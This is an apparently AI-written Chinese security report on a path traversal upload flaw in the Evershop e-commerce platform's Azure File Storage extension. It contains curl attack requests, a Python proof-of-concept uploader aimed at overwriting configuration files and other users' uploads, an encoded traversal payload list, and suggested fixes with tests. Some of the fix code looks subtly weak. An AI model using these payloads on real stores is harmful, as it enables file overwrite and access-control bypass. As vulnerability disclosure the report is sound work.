# Evershop Azure File Storage 路径遍历上传漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform - Azure File Storage Extension
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：路径遍历 (CWE-22) / 目录遍历 (CWE-23)
- **漏洞名称**：Evershop Azure File Uploader 路径遍历漏洞
- **风险等级**：高危
- **概述**：Azure File Storage扩展的`azureFileUploader.upload()`函数接受用户可控的`path`参数，直接拼接到Blob存储路径中，未进行任何路径规范化或验证。攻击者可通过路径遍历序列（如`../`）将文件上传到容器中的任意位置，可能覆盖关键文件或绕过访问控制。

### 2.2 利用前提与特征

- **利用难度**：低
- **权限要求**：取决于上传功能的访问控制
- **操作条件**：
  1. 系统使用Azure File Storage扩展
  2. 上传功能暴露给攻击者
- **攻击特征**：路径参数中包含`../`或其他路径遍历序列

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **任意路径上传**：将文件上传到Blob容器中的任意位置
2. **文件覆盖**：覆盖现有文件，可能导致数据丢失或功能破坏
3. **访问控制绕过**：上传到受保护目录或突破目录隔离
4. **代码执行风险**：如果Blob被作为静态资源服务，可能上传恶意脚本

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：定位漏洞代码**

文件：`extensions/azure_file_storage/src/services/azureFileUploader.ts`
```typescript
export const azureFileUploader = {
  upload: async (files: Express.Multer.File[], path: string) => {
    const blobServiceClient = BlobServiceClient.fromConnectionString(
      getEnv("AZURE_STORAGE_CONNECTION_STRING")
    );
    const containerName = getEnv("AZURE_STORAGE_CONTAINER_NAME", "images");
    const containerClient = blobServiceClient.getContainerClient(containerName);

    const requestedPath = path;  // 用户可控，未经验证
    const uploadedFiles: UploadedFile[] = [];

    for (const file of files) {
      // 直接拼接路径，存在路径遍历风险
      const path = requestedPath
        ? `${requestedPath}/${file.filename}`  // <-- 未过滤 ../
        : `${file.filename}`;

      const blobClient = containerClient.getBlockBlobClient(path);  // 使用不安全路径
      await blobClient.upload(file.buffer, file.buffer.length);
      // ...
    }
  },
};
```

**步骤2：分析数据流**

1. `path` 参数来自用户输入（HTTP请求）
2. 直接与文件名拼接：`${requestedPath}/${file.filename}`
3. 传递给Azure Blob SDK：`getBlockBlobClient(path)`
4. 无路径规范化、无遍历序列过滤

**步骤3：构造攻击请求**

```bash
# 正常上传
curl -X POST 'https://target.com/api/upload' \
  -F 'files=@malicious.jpg' \
  -F 'path=products/images'

# 路径遍历攻击 - 上传到根目录
curl -X POST 'https://target.com/api/upload' \
  -F 'files=@malicious.jpg' \
  -F 'path=../../../'

# 路径遍历攻击 - 覆盖特定文件
curl -X POST 'https://target.com/api/upload' \
  -F 'files=@malicious.config' \
  -F 'path=../../config'
```

**步骤4：验证文件位置**

```bash
# 检查文件是否被上传到预期外的位置
az storage blob list --container-name images --output table
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Azure Path Traversal Upload PoC
"""

import requests
import io

class PathTraversalUploader:
    def __init__(self, target_url):
        self.target_url = target_url

    def upload_with_traversal(self, file_content, filename, malicious_path):
        """
        使用路径遍历上传文件
        """
        endpoint = f"{self.target_url}/api/upload"  # 假设的上传端点

        files = {
            'files': (filename, io.BytesIO(file_content), 'application/octet-stream')
        }
        data = {
            'path': malicious_path
        }

        print(f"[*] 目标端点: {endpoint}")
        print(f"[*] 恶意路径: {malicious_path}")
        print(f"[*] 文件名: {filename}")

        response = requests.post(endpoint, files=files, data=data)

        if response.status_code == 200:
            print("[+] 上传成功!")
            print(f"[+] 响应: {response.json()}")
            return True
        else:
            print(f"[-] 上传失败: {response.status_code}")
            print(f"[-] 响应: {response.text}")
            return False

    def escape_directory(self, levels=3):
        """
        生成目录逃逸路径
        """
        return '../' * levels

    def target_specific_path(self, target_dir):
        """
        构造指向特定目录的路径
        """
        # 从images目录逃逸并指向目标
        return f"../../{target_dir}"


def main():
    target = "https://shop.example.com"

    uploader = PathTraversalUploader(target)

    print("=" * 60)
    print(" Azure Path Traversal Upload PoC")
    print("=" * 60)
    print()

    # 示例1: 上传到容器根目录
    print("[*] 测试1: 上传到容器根目录")
    uploader.upload_with_traversal(
        b"test file content",
        "test.txt",
        "../../../"
    )

    # 示例2: 覆盖配置文件
    print("\n[*] 测试2: 尝试覆盖配置文件")
    uploader.upload_with_traversal(
        b"malicious config content",
        "config.json",
        "../../config"
    )

    # 示例3: 上传到其他用户目录
    print("\n[*] 测试3: 上传到其他用户目录")
    uploader.upload_with_traversal(
        b"injected file",
        "injected.txt",
        "../other-user-uploads"
    )


if __name__ == "__main__":
    main()
```

### 4.2 路径遍历变体

```python
def generate_traversal_payloads():
    """
    生成各种路径遍历payload
    """
    payloads = [
        # 基本遍历
        "../",
        "../../",
        "../../../",

        # URL编码
        "%2e%2e/",
        "%2e%2e%2f",
        "..%2f",

        # 双重编码
        "%252e%252e%252f",

        # Unicode编码
        "..%c0%af",
        "..%c1%9c",

        # 混合
        "....//",
        "..../",
        "..\\",

        # 绝对路径尝试
        "/etc/passwd",
        "\\..\\..\\",
    ]
    return payloads
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              Azure Upload 路径遍历数据流                         │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  HTTP请求:                                                      │
│  POST /api/upload                                              │
│  { path: "../../../malicious", files: [...] }                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 上传Handler                              │                  │
│  │                                         │                  │
│  │ const path = request.body.path;         │                  │
│  │ azureFileUploader.upload(files, path);  │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ azureFileUploader.ts                    │                  │
│  │                                         │                  │
│  │ const requestedPath = path;  ← 未验证    │                  │
│  │                                         │                  │
│  │ for (file of files) {                   │                  │
│  │   const blobPath = requestedPath        │                  │
│  │     ? `${requestedPath}/${file.filename}`│  ← 直接拼接     │
│  │     : file.filename;                    │                  │
│  │                                         │                  │
│  │   // blobPath = "../../../malicious/x"  │                  │
│  │   blobClient.getBlockBlobClient(blobPath);│                │
│  │   blobClient.upload(...);               │                  │
│  │ }                                       │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ Azure Blob Storage                      │                  │
│  │                                         │                  │
│  │ 文件被上传到:                            │                  │
│  │ container/images/../../../malicious/x   │                  │
│  │ (规范化后可能是 container/malicious/x)   │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **无输入验证**：`path`参数未经任何检查直接使用
2. **无路径规范化**：未使用`path.normalize()`或类似处理
3. **无遍历序列过滤**：未检测或移除`../`、`..\\`等序列
4. **无白名单限制**：未限制允许的上传目录

## 6. 修复建议

### 6.1 方案A：路径规范化与验证

```typescript
import path from 'path';

export const azureFileUploader = {
  upload: async (files: Express.Multer.File[], requestPath: string) => {
    // 定义允许的基础目录
    const BASE_PATH = 'uploads';

    // 规范化路径
    const normalizedPath = path.normalize(requestPath).replace(/^(\.\.[\/\\])+/, '');

    // 构造完整路径
    const fullPath = path.join(BASE_PATH, normalizedPath);

    // 验证路径未逃逸基础目录
    if (!fullPath.startsWith(BASE_PATH)) {
      throw new Error('Invalid path: directory traversal detected');
    }

    // ... 继续上传逻辑
  },
};
```

### 6.2 方案B：白名单验证

```typescript
const ALLOWED_PATHS = ['products', 'categories', 'users', 'temp'];

function validatePath(requestPath: string): boolean {
  // 移除开头的斜杠
  const cleanPath = requestPath.replace(/^[\/\\]+/, '');

  // 检查是否在白名单中
  const topDir = cleanPath.split(/[\/\\]/)[0];
  return ALLOWED_PATHS.includes(topDir);
}

export const azureFileUploader = {
  upload: async (files: Express.Multer.File[], requestPath: string) => {
    if (!validatePath(requestPath)) {
      throw new Error('Invalid upload path');
    }
    // ...
  },
};
```

### 6.3 方案C：严格过滤遍历序列

```typescript
function sanitizePath(inputPath: string): string {
  // 移除所有路径遍历序列
  let sanitized = inputPath
    .replace(/\.\./g, '')           // 移除 ..
    .replace(/[\/\\]+/g, '/')       // 规范化斜杠
    .replace(/^[\/\\]+/, '')        // 移除开头斜杠
    .replace(/[\/\\]+$/, '');       // 移除结尾斜杠

  // 只允许字母数字和有限的特殊字符
  if (!/^[a-zA-Z0-9\/_-]+$/.test(sanitized)) {
    throw new Error('Invalid characters in path');
  }

  return sanitized;
}
```

### 6.4 安全测试用例

```typescript
describe('Path Traversal Prevention', () => {
  const traversalPayloads = [
    '../',
    '../../',
    '../../../etc/passwd',
    '..\\..\\',
    '%2e%2e%2f',
    '....//....//..../',
  ];

  traversalPayloads.forEach(payload => {
    it(`should reject path: ${payload}`, async () => {
      await expect(
        azureFileUploader.upload(testFile, payload)
      ).rejects.toThrow(/invalid|traversal/i);
    });
  });
});
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
